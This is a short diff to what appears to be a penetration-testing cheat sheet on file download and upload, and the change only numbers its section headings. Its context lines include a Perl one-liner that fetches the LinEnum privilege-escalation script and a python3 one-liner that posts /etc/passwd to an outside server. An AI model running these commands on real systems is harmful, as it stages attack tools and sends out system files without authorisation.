@@ -1,4 +1,4 @@
-# Download
+# 1.Download
 
 ## Windows
 
@@ -93,7 +93,7 @@ cat <&3
 ```perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'```
 
 <br/><br/>
-# Upload
+# 2.Upload
 
 ## Windows
 
@@ -143,7 +143,7 @@ python3 -m uploadserver 443 --server-certificate ~/server.pem
 ```python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'```
 
 <br/><br/>
-# File Transfer
+# 3.File Transfer
 
 ## Netcat 
 
